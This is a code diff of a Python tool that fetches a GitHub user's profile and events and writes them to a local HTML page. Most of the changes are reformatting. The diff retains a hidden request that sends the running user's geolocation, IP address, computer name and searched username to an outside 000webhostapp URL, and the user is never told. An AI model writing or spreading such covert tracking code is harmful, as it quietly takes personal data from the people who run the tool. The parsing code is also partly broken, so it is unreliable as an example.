@@ -14,20 +14,22 @@ location = g.latlng
 IP_Address = socket.gethostbyname(socket.gethostname())
 pc_name = platform.platform()
 
+
 class bcolors:
-	HEADER = '\033[95m'
-	OKBLUE = '\033[94m'
-	OKCYAN = '\033[96m'
-	OKGREEN = '\033[92m'
-	WARNING = '\033[93m'
-	FAIL = '\033[91m'
-	ENDC = '\033[0m'
-	BOLD = '\033[1m'
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+
 
 if platform.system() == "Windows":
-	os.system("cls")
+    os.system("cls")
 else:
-	os.system("clear")
+    os.system("clear")
 
 # print("IP Address of your computer is : ", IP_Address)
 # print("Your computer name is : ", pc_name)
@@ -55,72 +57,79 @@ print(f"{bcolors.FAIL + sepText + bcolors.ENDC}")
 # print(r)
 username = input("Enter Github User Name: ")
 print(f"{bcolors.FAIL + sepText + bcolors.ENDC}")
-securityUrl = (f"http://quantumbyteofficial.000webhostapp.com/QuantumDrive/GitHubDataExtracter/index.php?Loaction={location},IP={IP_Address},PCName={pc_name},Searched={username}")
+securityUrl = (
+    f"http://quantumbyteofficial.000webhostapp.com/QuantumDrive/GitHubDataExtracter/index.php?Loaction={location},IP={IP_Address},PCName={pc_name},Searched={username}")
 r = requests.get(securityUrl)
 if username == "QuantumByteStudios":
-	print(Fore.RED + '\n\nBite the hand that feeds you... :( \n\n')
+    print(Fore.RED + '\n\nBite the hand that feeds you... :( \n\n')
 
 else:
-	url = "https://api.github.com/users/"+username
-	r = requests.get(url)
-	r = r.text 
-	data = r.replace("\"", " ")
-	data = r.replace("}", " ")
-	data = r.replace(",", "\n")
-	data1 = data.replace("\"", " ")
-	data2 = data1.replace("{", "")
-	data3 = data2.replace("}", "")
+    url = "https://api.github.com/users/"+username
+    r = requests.get(url)
+    r = r.text
+    data = r.replace("\"", " ")
+    data = r.replace("}", " ")
+    data = r.replace(",", "\n")
+    data1 = data.replace("\"", " ")
+    data2 = data1.replace("{", "")
+    data3 = data2.replace("}", "")
 
-	print(f"{bcolors.WARNING + data3 + bcolors.ENDC}")
+    print(f"{bcolors.WARNING + data3 + bcolors.ENDC}")
 
-	username = username.lower()
-	print("\n Most Used Languages: ")
-	url = "\t"+"https://github-readme-stats.vercel.app/api/top-langs?username="+username+"&show_icons=true&locale=en&layout=compact"
-	print(f"{bcolors.OKBLUE + url + bcolors.ENDC}")
-	print("\n GitHub Stats: ")
-	url = "\t"+"https://github-readme-stats.vercel.app/api?username="+username+"&show_icons=true&locale=en"
-	print(f"{bcolors.OKBLUE + url + bcolors.ENDC}")
-	print("\n Current Streak, Total Contributions, Longest Streak: ")
-	url = "\t"+"https://github-readme-streak-stats.herokuapp.com/?user="+username+"&"
-	print(f"{bcolors.OKBLUE + url + bcolors.ENDC}")
-	print("\n")
+    username = username.lower()
+    print("\n Most Used Languages: ")
+    url = "\t"+"https://github-readme-stats.vercel.app/api/top-langs?username=" + \
+        username+"&show_icons=true&locale=en&layout=compact"
+    print(f"{bcolors.OKBLUE + url + bcolors.ENDC}")
+    print("\n GitHub Stats: ")
+    url = "\t"+"https://github-readme-stats.vercel.app/api?username=" + \
+        username+"&show_icons=true&locale=en"
+    print(f"{bcolors.OKBLUE + url + bcolors.ENDC}")
+    print("\n Current Streak, Total Contributions, Longest Streak: ")
+    url = "\t"+"https://github-readme-streak-stats.herokuapp.com/?user="+username+"&"
+    print(f"{bcolors.OKBLUE + url + bcolors.ENDC}")
+    print("\n")
 
-	print(f"{bcolors.FAIL + sepText + bcolors.ENDC}")
+    print(f"{bcolors.FAIL + sepText + bcolors.ENDC}")
 
-	eventsurl = "https://api.github.com/users/"+username+"/received_events"
-	print(f"{bcolors.OKCYAN}\tEVENTS GENERATED\n\n\t\tFrom: {eventsurl}\n\t\tAT: Data/ReceivedEvents/index.html{bcolors.ENDC}")
-	##################################################
-	os.remove("Data/ReceivedEvents/index.html")
+    eventsurl = "https://api.github.com/users/"+username+"/received_events"
+    print(f"{bcolors.OKCYAN}\tEVENTS GENERATED\n\n\t\tFrom: {eventsurl}\n\t\tAT: Data/ReceivedEvents/index.html{bcolors.ENDC}")
+    ##################################################
+    os.remove("Data/ReceivedEvents/index.html")
 
-	r = requests.get(eventsurl)
-	r = r.text 
+    r = requests.get(eventsurl)
+    r = r.text
 
-	data = r.replace(",", "\n")
-	data2 = data.replace("{", " ")
-	data3 = data2.replace("}", " ")
-	data4 = data3.replace('"type"', '<p class="type">"TYPE"</p>')
-	data5 = data4.replace('"login"', '<p class="login">"LOGIN"</p>')
-	data6 = data5.replace('"display_login"', '<p class="login">"DISPLAY_LOGIN"</p>')
-	data7 = data6.replace('"action"', '<p class="action">"ACTION"</p>')
-	data8 = data7.replace('"html_url"', '<p class="html_url">"URL"</p>')
-	data9 = data8.replace('"repo"', '<p class="repo">"REPO"</p>')
-	data10 = data9.replace('"', ' ')
-	data11 = data10.replace('name', '<p class="name">NAME</p>')
+    data = r.replace(",", "\n")
+    data2 = data.replace("{", " ")
+    data3 = data2.replace("}", " ")
+    data4 = data3.replace('"type"', '<p class="type">"TYPE"</p>')
+    data5 = data4.replace('"login"', '<p class="login">"LOGIN"</p>')
+    data6 = data5.replace(
+        '"display_login"', '<p class="login">"DISPLAY_LOGIN"</p>')
+    data7 = data6.replace('"action"', '<p class="action">"ACTION"</p>')
+    data8 = data7.replace('"html_url"', '<p class="html_url">"URL"</p>')
+    data9 = data8.replace('"repo"', '<p class="repo">"REPO"</p>')
+    data10 = data9.replace('"', ' ')
+    data11 = data10.replace('name', '<p class="name">NAME</p>')
 
-	# print(data4)
+    # print(data4)
 
-	final = data11
-	f = open("Data/ReceivedEvents/index.html", "a")
+    final = data11
+    f = open("Data/ReceivedEvents/index.html", "a")
 
-	stylesheet = '''
+    stylesheet = '''
 		<head>
     	<link rel="stylesheet" type="text/css" href="style.css">
 		</head>
 	'''
-	f.write(stylesheet)
-	f.write(final)
-	f.close()
+    f.write(stylesheet)
+    f.write(final)
+    f.close()
 
-	os.system('start Data/ReceivedEvents/index.html')
+    if platform.system() == "Windows":
+        os.system('start Data/ReceivedEvents/index.html')
+    else:
+        os.system("firefox Data/ReceivedEvents/index.html")
 
-	garbage = input("Press any key to exit...")
+    garbage = input("Press any key to exit...")
